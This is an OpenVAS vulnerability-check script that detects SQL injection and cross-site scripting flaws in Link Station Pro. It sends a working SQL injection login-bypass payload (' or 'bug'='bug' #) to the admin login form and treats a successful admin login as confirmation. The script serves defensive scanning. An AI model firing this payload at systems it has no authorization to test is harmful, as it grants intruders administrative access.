###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_link_station_pro_sql_inj_n_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Link Station Pro SQL Injection and Cross Site Scripting Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to cause SQL Injection attack
  or to execute arbitrary HTML and script code in a user's browser session in
  the context of an affected site.
  Impact Level: Application";
tag_affected = "Link Station Pro.";
tag_insight = "The flaws are due to improper validation of user-supplied input,
  - In 'Username' and 'Password' parameter to the 'index.php',
  - In 'AddNewCategory' and 'categoryname' parameter to the
    'manage_categories.php'";
tag_solution = "No solution or patch is available as of 16th August, 2011. Information
  regarding this issue will updated once the solution details are available.
  For updates refer to http://www.linkstationpro.com/";
tag_summary = "The host is running Link Station Pro and is prone to SQL injection
  and cross site scripting vulnerabilities.";

if(description)
{
  script_id(801967);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-08-18 14:57:45 +0200 (Thu, 18 Aug 2011)");
  script_bugtraq_id(48948);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Link Station Pro SQL Injection and Cross Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/45479/");
  script_xref(name : "URL" , value : "http://forums.cnet.com/7726-6132_102-5178348.html");
  script_xref(name : "URL" , value : "http://securityreason.com/wlb_show/WLB-2011080004");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/103582/linkstation-sqlxss.txt");

  script_description(desc);
  script_summary("Determine if Link Station Pro is prone to SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

foreach dir(make_list("/admin", "/link", "/linkstation", cgi_dirs()))
{
  ## Send and Receive the response
  req = string("GET ", dir, "/index.php", "\r\n",
               "Host: ", get_host_name(), "\r\n\r\n");
  res = http_send_recv(port:port, data:req);

  ## Confirm the application
  if(">Link Station Pro Admin Management Login<" >< res)
  {
    ## Try SQL injection
    authVariables = "op=adminlogin&username=%27+or+%27bug%27%3D%27bug%27+" +
                    "%23&password=%27+or+%27bug%27%3D%27bug%27+%23";

    req = string("POST ", dir, "/index.php HTTP/1.1\r\n",
                 "Host: ",get_host_name(),"\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                 authVariables);

    res = http_keepalive_send_recv(port:port, data:req);

    ## Confirm exploit worked by checking the response
    if(">You have now logged in to the Link Station Pro Admin Area<" >< res)
    {
      security_hole(port:port);
      exit(0);
    }
  }
}
